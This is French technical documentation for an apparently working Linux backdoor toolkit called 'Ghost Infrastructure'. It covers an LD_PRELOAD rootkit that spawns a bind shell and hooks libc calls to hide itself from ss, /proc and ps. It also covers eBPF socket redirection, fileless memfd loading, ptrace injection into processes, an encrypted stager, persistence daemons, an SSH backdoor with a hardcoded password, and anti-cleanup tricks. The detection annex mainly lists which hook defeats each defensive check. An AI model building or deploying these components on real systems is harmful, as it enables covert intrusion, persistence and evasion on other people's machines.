# Documentation Technique — Ghost Infrastructure

---

## `config.h` — Configuration centralisée

### Description
Header commun définissant toutes les constantes du projet. Facilite la modification des paramètres globaux (ports, paths, noms).

### Constantes principales
```c
#define GHOST_PORT          9999    // Port d'écoute principal
#define SURVIVAL_PORT       8888    // Port du daemon de survie
#define KILL_SWITCH         "/tmp/.ghost_off"
#define FAKE_THREAD_NAME    "[kworker/u24:5]"
#define UNIX_BRIDGE        "ghost_bridge"
#define BPF_OBJ_PATH        "ghost.bpf.o"
#define GHOST_SO_NAME       "libghost"
```

---

## `ghost_lib.c` / `hijack.so` — Backdoor + Rootkit LD_PRELOAD

### Description
Bibliothèque partagée constituant le cœur du projet. Injectée via `LD_PRELOAD` dans un processus cible, elle démarre un listener TCP invisible et intercepte des appels système pour se masquer.

### Composants internes

#### Thread `ghost_listener`
```
socket() → bind(:9999) → listen() → [boucle]
    ↓ select() avec timeout 2s (vérification kill switch + non-bloquant)
    ↓ accept() → fork()
        ↓ (enfant) dup2() → unsetenv(LD_PRELOAD) → execl("/bin/bash")
```
- Le port d'écoute est `9999` (défini par `GHOST_PORT` dans config.h)
- `FD_CLOEXEC` sur le socket serveur : évite l'héritage par le bash enfant
- **Kill switch** : si `/tmp/.ghost_off` existe, le thread s'arrête proprement
- Masquage du nom de thread : `prctl(PR_SET_NAME, "[kworker/u24:5]")`
- Détection du processus cible via `/proc/self/exe` (plus sécurisé que `/proc/self/comm`)

#### Hook `readdir()`
- Intercepte l'énumération de `/proc/self/fd/`
- Compare `entry->d_name` avec le numéro du file descriptor du socket serveur
- Filtre l'entrée correspondante → le FD est invisible dans `/proc/<pid>/fd/`

#### Hook `recvmsg()`
- Intercepte les réponses Netlink (utilisées par `ss`, `netstat`)
- Parcourt les messages `NLMSG` et retire les entrées `inet_diag_msg` dont `idiag_sport == 9999`
- Résultat : le port 9999 n'apparaît pas dans `ss -ltpn`

#### Hook `bind()`
- Force `SO_REUSEADDR | SO_REUSEPORT` sur tout appel `bind()` du processus
- Évite les erreurs "Address already in use"

#### Hook `open()` — NOUVEAU
- Intercepte les ouvertures de `/proc/self/maps` et `/proc/self/environ`
- Génère des versions filtrées dans `/tmp/.ghost_maps_<pid>` et `/tmp/.ghost_environ_<pid>`
- Filtre :
  - Lignes contenant le nom de la lib (`GHOST_SO_NAME`)
  - Lignes contenant des paths `/tmp/` avec `.so`
  - Variable `LD_PRELOAD=` dans l'environnement

#### Constructeur/Destructeur
- `__attribute__((constructor))` `init_ghost()` : lance le thread listener
- `__attribute__((destructor))` `cleanup_ghost()` : fermeture propre du socket

### Gestion d'erreurs
- Toutes les fonctions de la libc sont résolues via `dlsym(RTLD_NEXT, ...)`
- Vérification systématique des retours d'appels système
- Variables statiques initialisées à NULL, résolution lazy

### Compilation
```bash
gcc -fPIC -shared -o hijack.so ghost_lib.c -ldl -lpthread
```

---

## `ghost.bpf.c` — Programme eBPF sk_lookup

### Description
Programme eBPF de type `sk_lookup` qui intercepte les paquets entrants au niveau du namespace réseau et les redirige vers un socket fantôme, contournant la logique d'écoute TCP standard.

### Fonctionnement
```
Paquet entrant (port 9999)
    ↓
sk_lookup hook (ghost_redir_port)
    ↓
Consultation de ghost_sock_map[0]
    ↓
bpf_sk_assign() → paquet assigné au socket fantôme
    ↓ SK_PASS
```

### Map utilisée
- Type : `BPF_MAP_TYPE_SOCKMAP`
- Clé : `__u32` (index 0)
- Valeur : `__u64` (socket FD stocké par le loader)

### Prérequis kernel
- Kernel ≥ 5.9 (introduction de `BPF_SK_LOOKUP`)
- `CAP_NET_ADMIN` pour l'attachement au namespace réseau

---

## `loader.c` — Chargeur eBPF + transfert de FD

### Description
Programme userland qui charge l'objet BPF compilé, crée un socket fantôme, l'injecte dans la map eBPF, attache le programme au namespace réseau, puis transfère le file descriptor via socket Unix.

### Flux d'exécution
```
bpf_object__open_file(BPF_OBJ_PATH)
    ↓
bpf_object__load()
    ↓
Création d'un socket fantôme (AF_INET, SOCK_STREAM)
    ↓
setsockopt(SO_ATTACH_BPF) → attachement SOCKMAP
    ↓
bpf_map_update_elem(ghost_sock_map, 0, socket_fd)
    ↓
bpf_prog_attach(prog_fd, netns_fd, BPF_SK_LOOKUP)
    ↓
send_fd() → envoi du FD via SCM_RIGHTS sur socket Unix abstrait
```

### Corrections appliquées
- Utilisation de `SO_ATTACH_BPF` via `setsockopt()` au lieu de store direct
- Cleanup complet de tous les FDs en fin de programme
- Utilisation des constantes depuis `config.h`
- Gestion d'erreurs à chaque étape

### Transfert de FD (SCM_RIGHTS)
- Socket Unix abstrait (chemin `\0ghost_bridge`)
- Le FD est encapsulé dans un message ancillaire `CMSG` de type `SCM_RIGHTS`
- Le kernel gère la duplication du descripteur dans l'espace du processus récepteur

---

## `receiver.c` — Récepteur du socket fantôme

### Description
Programme qui reçoit le file descriptor du socket fantôme depuis le loader via `SCM_RIGHTS`, puis se met en attente de connexions entrantes en mode "ghost" (aucun `bind()` visible, aucun `listen()` standard).

### Fonctionnement
```
Bind sur socket Unix abstrait "ghost_bridge"
    ↓
accept() → receive_fd() → ghost_sk obtenu
    ↓
[boucle] accept(ghost_sk) → fork() → shell
```

- Le processus se masque via `prctl(PR_SET_NAME, "[kworker/u24:5]")`
- Aucun port n'est ouvert en écoute classique (invisible à `ss`)

---

## `evador.c` — Chargement .so sans fichier disque

### Description
Démonstrateur du chargement d'une bibliothèque partagée en mémoire via `memfd_create()`, sans jamais créer de fichier sur le système de fichiers.

### Mécanisme
```
open("hijack.so") → lecture en buffer RAM
    ↓
memfd_create("ghost_lib", MFD_CLOEXEC) → fd anonyme en RAM
    ↓
write(fd, buffer, size)
    ↓
lseek(fd, 0, SEEK_SET) → repositionnement
    ↓
dlopen("/proc/self/fd/<fd>", RTLD_NOW | RTLD_GLOBAL)
    ↓
close(fd) — le mapping reste actif tant que la lib est chargée
```

### Corrections appliquées
- Vérification complète des retours de `open()`, `lseek()`, `read()`, `write()`
- Allocation mémoire avec vérification (`malloc`)
- `keep_alive_handle` static pour maintenir la lib chargée
- Messages d'erreur explicites

- `MFD_CLOEXEC` : le FD est fermé automatiquement lors d'un `exec()`
- Le fichier n'apparaît pas dans `lsof` ni dans les listings du système de fichiers

---

## `injector.c` — Injection ptrace complète

### Description
Implémentation complète de l'injection d'une bibliothèque partagée dans un processus distant via l'API `ptrace`.

### Principe
```
ptrace(PTRACE_ATTACH, pid)
    ↓
waitpid() → attente que le processus s'arrête
    ↓
ptrace(PTRACE_GETREGS) → sauvegarde des registres originaux
    ↓
Injection du chemin .so dans la mémoire du processus cible (PTRACE_POKEDATA)
    ↓
Modification de RIP → pointe sur dlopen()
    RDI = adresse du chemin injecté, RSI = RTLD_LAZY
    ↓
ptrace(PTRACE_CONT) → exécution du dlopen
    ↓
Attente courte (usleep)
    ↓
Restauration des registres originaux
ptrace(PTRACE_DETACH)
```

### Corrections appliquées
- Validation des paramètres (pid > 0, chemin < MAX_PATH)
- Résolution de `dlopen` dans le processus local (pas de fuite d'adresse)
- Gestion d'erreurs complète à chaque étape ptrace
- Sauvegarde/restauration propre des registres
- Programme principal avec usage() et gestion de paramètres

### Compilation
```bash
gcc injector.c -o injector -ldl
```

### Usage
```bash
./injector <pid> /chemin/vers/lib.so
```

---

## `encrypt_payload.py` — Chiffrement AES-256-GCM

### Description
Script de chiffrement du payload `.so` avant transmission ou stockage.

### Algorithme
- **AES-256-GCM** (Authenticated Encryption with Associated Data)
- Clé : 32 octets aléatoires (`os.urandom(32)`)
- Nonce : 12 octets aléatoires (`os.urandom(12)`)
- Format de sortie : `[nonce (12B)] + [ciphertext + auth_tag (16B)]`

```python
ciphertext = aesgcm.encrypt(nonce, data, None)
output = nonce + ciphertext
```

### Usage
```bash
python3 encrypt_payload.py hijack.so
# Affiche la clé hex à conserver pour le déchiffrement
```

---

## `stager.py` — Déchiffrement + exécution fileless

### Description
Stager Python qui déchiffre un payload en RAM et le charge directement en mémoire via les bindings `ctypes` vers `libc` et `libdl`.

### Flux
```
Lecture de payload.so.enc
    ↓
Extraction nonce (12 premiers octets) + ciphertext
    ↓
AESGCM.decrypt() → données en RAM
    ↓
LIBC.syscall(SYS_memfd_create=319, "ghost", MFD_CLOEXEC)
    ↓
LIBC.write(fd, data, len)
    ↓
LIBDL.dlopen("/proc/self/fd/<fd>", RTLD_NOW | RTLD_GLOBAL)
    ↓
LIBC.close(fd)  — lib reste mappée
```

### Corrections appliquées
- Arguments CLI (`-p/--payload`, `-k/--key`)
- Validation de la clé hexadécimale
- Vérification de la taille du payload
- Gestion d'erreurs avec `use_errno=True`
- Messages d'erreur explicites
- Vérification des retours de `memfd_create`, `write`, `dlopen`

### Usage
```bash
python3 stager.py -p payload.so.enc -k <cle_hex_64_chars>
```

### Dépendances
```bash
pip install cryptography
```

---

## `ghost_deploy.sh` — Déploiement LD_PRELOAD complet

### Description
Script principal d'orchestration du déploiement. Compile le payload C, crée les workspaces redondants, injecte la bibliothèque via `LD_PRELOAD` dans `gnome-terminal-server` et verrouille l'infrastructure.

### Commandes
```bash
./ghost_deploy.sh start   # Déploiement complet
./ghost_deploy.sh stop    # Nettoyage global
./ghost_deploy.sh check   # Vérification du port 9999
```

### Workspaces redondants
| Path | Localisation |
|---|---|
| `/var/tmp/.test_system_conf` | Persiste entre les reboots |
| `/tmp/.cache_service` | Tmpfs standard |
| `/tmp/.X11-unix-render` | Mimicry du socket X11 |
| `/tmp/.systemd-private-core` | Mimicry des répertoires systemd |

### Mécanisme anti-cleanup
1. `touch -- "$target/-i"` → un fichier nommé littéralement `-i`
2. Si quelqu'un exécute `rm -rf *` dans ce dossier, le shell interprète `-i` comme le flag interactif
3. `chmod 555 $target` → bit d'écriture retiré sur le répertoire parent : `unlink()` échoue sur les fichiers enfants

---

## `ghost_swap.sh` — Injection chirurgicale

### Description
Version allégée et ciblée du déploiement : tue l'instance courante de `gnome-terminal-server` et la relance avec `LD_PRELOAD` injectée.

```bash
pkill -9 -u $USER -f "gvfsd"      # Nettoyage résidus
killall -9 gnome-terminal-server  # Arrêt du terminal
LD_PRELOAD="/tmp/libghost.so" nohup gnome-terminal-server &!
```

- `&!` (Zsh) ou `& disown` (Bash) pour détacher totalement du shell courant
- Vérifie ensuite que le port 9999 est bien en écoute via `ss`

---

## `survival.sh` — Daemon de survie

### Description
Compile et déploie un daemon C indépendant qui survit au logout de l'utilisateur.

### Techniques de survie
```
fork() → exit(parent)       # Premier fork
setsid()                    # Nouveau groupe de session
fork() → exit(parent)       # Deuxième fork (plus de session leader)
signal(SIGHUP, SIG_IGN)    # Ignore la déconnexion
signal(SIGTERM, SIG_IGN)   # Ignore la terminaison
close(0..31)               # Détache tous les FDs (TTY inclus)
```

- Le double-fork garantit que le processus n'est plus un session leader → ne peut pas recevoir `SIGHUP`
- `loginctl enable-linger` : permet aux services user systemd de rester actifs sans session

### Port utilisé
- `8888` (indépendant du port 9999 de `ghost_lib.c`)

### Commandes
```bash
./survival.sh start
./survival.sh stop
nc localhost 8888   # Connexion au shell
```

---

## `master_deploy.sh` — Infrastructure complète

### Description
Script maître combinant toutes les techniques : redondance FS, VM en RAM via libvirt/KVM, backdoor SSH Python (paramiko), VNC et service systemd.

### Phases d'exécution

| Phase | Action |
|---|---|
| 0 | Vérification des dépendances, `loginctl enable-linger` |
| 1 | Déploiement des 4 workspaces + injection `-i` + `chmod 777` |
| 2 | Construction d'un initramfs personnalisé avec `cpio` + payload intégré |
| 3 | Lancement d'une VM KVM via libvirt avec port-forward `8888→4444` |
| 4 | Verrouillage (`chmod 555`) de tous les workspaces |
| + | Lancement VNC (:42), SSH Python (port 2222), service systemd `socat` |

### Backdoor SSH (paramiko)
- Serveur SSH custom implémenté en Python avec `paramiko`
- Port `2222`, mot de passe `123456`
- Spawn d'un PTY bash via `pty.fork()`

### VM libvirt
- Kernel et initramfs copiés depuis `/boot`
- Payload `init_pwn.sh` intégré dans l'initramfs via `cpio`
- La VM écoute sur le port `4444` (guest), forwardé sur `8888` (host)
- La VM tourne entièrement en RAM (256 MiB)

---

## `full.sh` — Nettoyage global

### Description
Script de remise à zéro complète de l'infrastructure.

```bash
./full.sh
```

Actions :
- `pkill -9 -f "nc -l -p 8888"` → arrêt du listener nc
- `pkill -9 -f "kworker/u24:5"` → arrêt du thread masqué
- `unset LD_PRELOAD` → suppression de l'injection dans le shell courant
- `rm -f /tmp/.ghost_off` → suppression du kill switch (si présent)
- `rm -f /tmp/.ghost_*` → nettoyage des fichiers temporaires de filtrage

---

## Annexe : Détection et contre-mesures

### Vecteurs de détection Blue Team

| Outil | Commande de détection |
|---|---|
| LD_PRELOAD | `grep -r LD_PRELOAD /proc/*/environ` |
| Maps | `grep -r '/tmp' /proc/*/maps \| grep '\.so'` |
| Thread kworker | `ps -eo pid,ppid,user,comm \| grep kworker` |
| BPF | `bpftool prog list` |
| Systemd | `systemctl --user list-units` |

### Contre-mesures implémentées

| Détection | Contre-mesure |
|---|---|
| `/proc/environ` | Hook `open()` filtrant `LD_PRELOAD=` |
| `/proc/maps` | Hook `open()` filtrant les lignes `.so` |
| `ss` / `netstat` | Hook `recvmsg()` filtrant les ports Netlink |
| `/proc/<pid>/fd` | Hook `readdir()` masquant le FD |
| `ps` / `top` | `prctl(PR_SET_NAME, "[kworker/u24:5]")` |
